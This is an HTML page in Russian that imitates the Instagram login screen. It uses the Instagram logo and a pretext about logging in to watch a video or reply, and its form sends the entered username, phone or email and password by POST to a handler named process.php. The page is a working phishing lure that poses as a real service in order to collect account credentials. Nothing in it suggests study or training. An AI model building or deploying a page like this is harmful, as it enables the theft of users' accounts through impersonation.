<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Войти для просмотра видео</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }
        .info-text {
            text-align: center;
            margin-bottom: 30px;
            font-size: 22px;
            font-weight: bold;
            color: #262626;
        }
        .login-container {
            width: 350px;
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 100px;
            height: auto;
        }
        .form-group {
            margin-bottom: 15px;
            position: relative;
        }
        .form-group label {
            display: block;
            font-size: 12px;
            color: #8e8e8e;
            margin-bottom: 5px;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
        }
        .form-group input:focus {
            outline: none;
            border-color: #0095f6;
        }
        .toggle-password {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            font-size: 16px;
            color: #0095f6;
        }
        .toggle-password:hover {
            color: #005bb5;
        }
        .login-button {
            width: 100%;
            padding: 10px;
            font-size: 14px;
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-button:hover {
            background: #007ace;
        }
        .error-message {
            color: red;
            text-align: center;
            font-size: 18px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="info-text">
        <p>Для того чтобы откликнуться, сначала войдите в свой аккаунт.</p>
    </div>

    <div class="login-container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/120px-Instagram_logo_2022.svg.png" alt="Instagram Logo">
        </div>
        <!-- Форма отправляет данные на обработчик -->
        <form action="process.php" method="POST">
            <div class="form-group">
                <label for="username">Телефон, имя пользователя или email</label>
                <input type="text" id="username" name="username" placeholder="Введите данные" required>
            </div>
            <div class="form-group">
                <label for="password">Пароль</label>
                <input type="password" id="password" name="password" placeholder="Введите пароль" required>
                <span class="toggle-password" onclick="togglePassword()">
                    <i class="fas fa-eye"></i>
                </span>
            </div>
            <button type="submit" class="login-button">Войти</button>
        </form>
    </div>

    <script>
        function togglePassword() {
            const passwordField = document.getElementById('password');
            const toggleIcon = document.querySelector('.toggle-password i');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                toggleIcon.classList.remove('fa-eye');
                toggleIcon.classList.add('fa-eye-slash');
            } else {
                passwordField.type = 'password';
                toggleIcon.classList.remove('fa-eye-slash');
                toggleIcon.classList.add('fa-eye');
            }
        }
    </script>
</body>
</html>
